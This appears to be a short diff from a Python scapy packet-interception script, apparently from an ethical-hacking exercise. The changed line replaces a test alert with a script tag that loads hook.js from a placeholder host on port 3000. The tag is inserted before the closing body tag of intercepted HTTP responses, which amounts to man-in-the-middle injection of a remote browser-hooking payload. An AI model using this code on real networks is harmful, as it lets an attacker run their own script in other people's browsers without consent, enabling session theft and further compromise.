@@ -25,7 +25,7 @@ def process_packet(packet):
 
             elif http_packet[scapy.TCP].sport == 80:
                 print("[+] Response...")
-                injection_code = "<scrip>alert('test');</script>"
+                injection_code = '<script src="http://x.x.x.x:3000/hook.js"></script>'
                 load = load.replace("</body>", injection_code + "</body>")
                 content_length_search = re.search("(?:Content-Length:\\s)(\\d*)", load)
 
